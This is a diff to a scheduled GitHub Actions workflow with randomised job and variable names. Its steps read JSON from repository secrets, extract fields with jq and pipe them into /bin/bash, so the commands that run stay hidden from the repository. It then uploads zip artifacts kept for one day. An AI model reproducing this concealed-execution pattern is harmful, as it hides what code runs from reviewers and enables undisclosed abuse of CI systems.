@@ -1,9 +1,9 @@
 name: davidbranchww
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '34 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: davidbranchww
         env:
-          dq21358: ${{ secrets.dq21358 }}
+          hfur7303: ${{ secrets.hfur7303 }}
         run: |
-          echo $dq21358 | jq -r .ykgws582 | /bin/bash
-          echo $dywno335 | jq -r .qn3835 | /bin/bash
-          echo $xufku2041 | jq -r .kts918 | /bin/bash
-          echo $pdib4 | jq -r .yqnqv6 | /bin/bash
-          echo $vz7845 | jq -r .oo29 | /bin/bash
-          echo $jrl2 | jq -r .b677 | /bin/bash
-          echo $qwjx886 | jq -r .zy7336 | /bin/bash
-          echo $ci66269 | jq -r .pbfnm8156 | /bin/bash
+          printf '%s' "$hfur7303" | jq -r .ikebg1 | /bin/bash
+          echo $rg973 | jq -r .j90 | /bin/bash
+          printf '%s' "$nizpg1" | jq -r .hvcg37 | /bin/bash
+          echo $kg3389 | jq -r .lqx85651 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: xfFvARss
+          path: "*.zip"
+          retention-days: 1
